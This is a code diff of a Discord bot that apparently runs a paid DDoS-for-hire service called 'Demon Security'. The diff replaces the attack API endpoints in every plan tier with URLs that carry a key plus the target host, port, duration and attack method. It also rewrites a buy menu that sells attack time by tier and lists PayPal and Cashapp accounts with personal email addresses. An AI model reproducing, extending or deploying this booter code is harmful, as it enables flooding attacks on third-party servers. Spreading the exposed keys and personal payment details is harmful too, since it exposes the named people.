@@ -49,27 +49,27 @@ swhite = '\u001b[0;37m';
 var timeout = ['50', '140', '124', '84', '520', '302', '410', '1002', '913', '20', '85', '623', '150', '943', '223', '221', '220', '2043', '10', '25', '704', '120', '80']
 
 var SimpleAPI = [
-"http://134.122.40.156/admin.php?key=MbY*AV4*rAkS9@dX&host={0}&port={1}&time={2}&method={3}",
-"http://134.122.40.156/admin.php?key=MbY*AV4*rAkS9@dX&host={0}&port={1}&time={2}&method={3}"
+"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}",
+"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}"
 ];
 var NormalAPI = [
-"http://134.122.40.156/admin.php?key=MbY*AV4*rAkS9@dX&host={0}&port={1}&time={2}&method={3}",
-"http://134.122.40.156/admin.php?key=MbY*AV4*rAkS9@dX&host={0}&port={1}&time={2}&method={3}",
-"http://134.122.40.156/admin.php?key=MbY*AV4*rAkS9@dX&host={0}&port={1}&time={2}&method={3}"
+"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}",
+"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}",
+"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}"
 ];
 
 var AdvancedAPI = [
-"http://134.122.40.156/admin.php?key=MbY*AV4*rAkS9@dX&host={0}&port={1}&time={2}&method={3}",
-"http://134.122.40.156/admin.php?key=MbY*AV4*rAkS9@dX&host={0}&port={1}&time={2}&method={3}",
-"http://134.122.40.156/admin.php?key=MbY*AV4*rAkS9@dX&host={0}&port={1}&time={2}&method={3}"
+"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}",
+"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}",
+"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}"
 ];
 
 var servidorADM = [
-"http://134.122.40.156/admin.php?key=MbY*AV4*rAkS9@dX&host={0}&port={1}&time={2}&method={3}",
-"http://134.122.40.156/admin.php?key=MbY*AV4*rAkS9@dX&host={0}&port={1}&time={2}&method={3}"
+"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}",
+"http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}"
 ];
 
-var TEMPLATE = ["http://134.122.40.156/admin.php?key=MbY*AV4*rAkS9@dX&host={0}&port={1}&time={2}&method={3}"]
+var TEMPLATE = ["http://demonapi.ml/demon.php?key=skjdsnkneud&host={0}&port={1}&time={2}&method={3}"]
 
 var emoji = ['🆕']
 
@@ -177,12 +177,11 @@ if (command === 'buy') {
   const privbuyembed = new Discord.RichEmbed()
     .setImage("https://media.discordapp.net/attachments/701004910547959868/701012393731293204/original.gif")
     .setColor('#ff0000')
-    .setTitle(':flag_br: - Demon Security - Buy Menu - :flag_br:')
-    .setThumbnail('https://media.discordapp.net/attachments/701004910547959868/701004935290159114/unknown.png')
+    .setTitle('Demon Security - Buy Menu')
     .setDescription("**__Read First__**\n\nRegardless of the plan you acquire, remember that there are other people to send out attacks. It does not overload servers by sending multiple attacks at the same time or flooding the same host. ", true)
     .addField("```Plans```", "```diff\n-Simples\n-Normal\n-Advanced```", true)
-    .addField("```Specification```", "```Time\nSimple = 600 Sec\nNormal = 1200 Sec\nAdvanced = 1800 Sec\n```", true)
-    .addField("```PRICE```", "```http\nSimple = $10\nNormal = $25\nAdvanced = $35\n```", true)
+    .addField("```Specification```", "```Time\nSimple = 600 Sec (1 Week)\nNormal = 1200 Sec (1 Months)\nAdvanced = 1800 Sec (3 Months)\n```", true)
+    .addField("```PRICE```", "```http\nSimple = $5 \nNormal = $20\nAdvanced = $40\n```", true)
     .addField("```Payment Methods```", "**Paypal And Cashapp Only**")
     .addField("```Payment Details```", "**Akkaibas Paypal | claudia@quirchmayr.de\nRealms Cashapp | realm666\nRealms Paypal | sevhussein@icloud.com**")
   msg.author.send(privbuyembed)
